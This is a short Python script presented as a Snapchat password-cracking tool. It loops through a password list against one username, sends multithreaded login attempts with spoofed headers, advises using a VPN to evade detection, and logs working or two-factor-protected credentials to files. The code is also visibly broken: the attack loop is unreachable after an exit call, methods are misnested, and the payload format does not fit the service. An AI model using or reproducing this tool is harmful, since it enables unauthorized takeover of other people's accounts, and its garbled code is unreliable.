from __future__ import absolute_import
from __future__ import print_function
import requests, sys, threading, time, os, random
from random import randint
from six.moves import input


CheckVersion = str (sys.version)
import re
from datetime import datetime


print('''

        Author: Float
        Created For: Snapchat
        To User: Run With Vpn Service
''')


class Snap (object):
    def __init__(self):
        try:
            user = input ('username : ')
            Combo = input ('pass :')
            print("\n")

        except:
            print('Failed to load kernel')
            sys.exit ()

            with open(Combo, 'r') as x:
                Combolist = x.read ().splitlines() 
                thread = []
                self.Coutprox = 0
                for combo in Combolist:
                    password = combo.split (':')[0]
                    t = threading.Thread(target=self.New_Br, args=(user, password))
                    t.start ()
                    thread.append (t)
                    time.sleep (0.7)
                    for j in thread:
                        j.join()

        def cls(self):
            linux = 'clear'
            windows  = 'cls'
            os.system ([linux][os.name == 'nt'])

        def New_Br(self, user, pwd):
            link = 'https://accounts.snapchat.com/accounts/login'
            login_url = 'https://accounts.snapchat.com/accounts/login'
            time = int (datetime.now ().timestamp())
            payload = {
                'username' : user,
                'enc_password': f'#PWD_SNAPCHAT_BROWSER:0:{time}:{pwd}',
                'queryParams': {},
                'optIntoOneTap': 'false'
            }
            with requests.Session() as s:
                r = s.get (link)
                r = s.post (login_url, data=payload, headers={
                    "user-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
                    "X-Requested-With": "XMLHttpRequest",
                    "Referer": "https://accounts.snapchat.com/accounts/login",
                    "x-xsrftoken": 'cv_hTM564mz0rbOaJGjg4A'
                })
                print(f'{user}:{pwd}\n---------------')
                if 'checkpoint_url' in r.text:
                    print (('' + user + ':' + pwd +' '))
                    with open('pass.txt', 'a') as x:
                        x.write(user + ':' + pwd + '\n')
                elif 'two_factor_required' in r.text:
                    with open('NeedVerify.txt', 'a')as x:
                        x.write(user + ':' + pwd + '\n')
Snap()
    
